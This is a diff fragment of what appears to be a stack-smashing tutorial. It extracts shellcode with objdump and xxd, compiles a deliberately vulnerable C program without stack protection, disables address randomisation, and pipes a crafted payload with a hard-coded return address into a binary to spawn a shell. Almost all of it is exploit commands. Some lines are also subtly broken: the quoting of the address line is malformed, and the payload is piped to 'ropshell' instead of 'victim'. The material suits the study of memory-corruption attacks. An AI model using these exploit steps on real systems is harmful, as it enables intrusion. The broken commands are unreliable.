@@ -71,6 +71,8 @@ objdump -d ropshell | sed -n '/needle0/,/needle1/p'.
 
 . xxd -s0x4b8 -l40 -p ropshell shellcode
 
+
+
 #include <stdio.h>
 int main() {
 char name[64];
@@ -81,9 +83,12 @@ printf("Hello, %s!\n", name);
 return 0;
 }
 
+
 gcc -o victim -fno-stack-protector victim.c.
 
  setarch `arch` -R ./victim
+ 
+ a=\'printf %016x 0x7fffffffe1a0 | tac -rs..' 
 
  ((cat ropshell ; printf %080d 0 ; echo $a) | xxd -r -p ; cat ) | ./ropshell.
  
